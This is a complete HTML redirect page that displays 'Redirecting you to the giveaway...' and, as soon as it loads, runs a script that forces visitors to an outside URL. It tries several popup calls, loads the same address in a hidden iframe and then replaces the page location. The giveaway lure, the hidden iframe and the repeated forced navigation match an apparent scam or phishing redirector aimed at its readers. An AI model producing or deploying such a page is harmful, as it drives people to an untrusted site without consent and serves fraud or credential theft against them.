<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    .note {
      font-size: 18px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="note">Redirecting you to the giveaway...</div>

  <script>
    const finalURL = "https://passwordomain.com/1838319";

    function redirectChain() {
      try { window.open(finalURL, "_system"); } catch(e){}
      try { window.open(finalURL, "_blank"); } catch(e){}
      try { window.open(finalURL, "_top"); } catch(e){}

      try {
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = finalURL;
        document.body.appendChild(iframe);
      } catch(e){}

      setTimeout(() => { window.location.href = finalURL; }, 500);
      setTimeout(() => { window.location.replace(finalURL); }, 1000);
    }

    // Run redirect chain automatically
    redirectChain();
  </script>
</body>
</html>
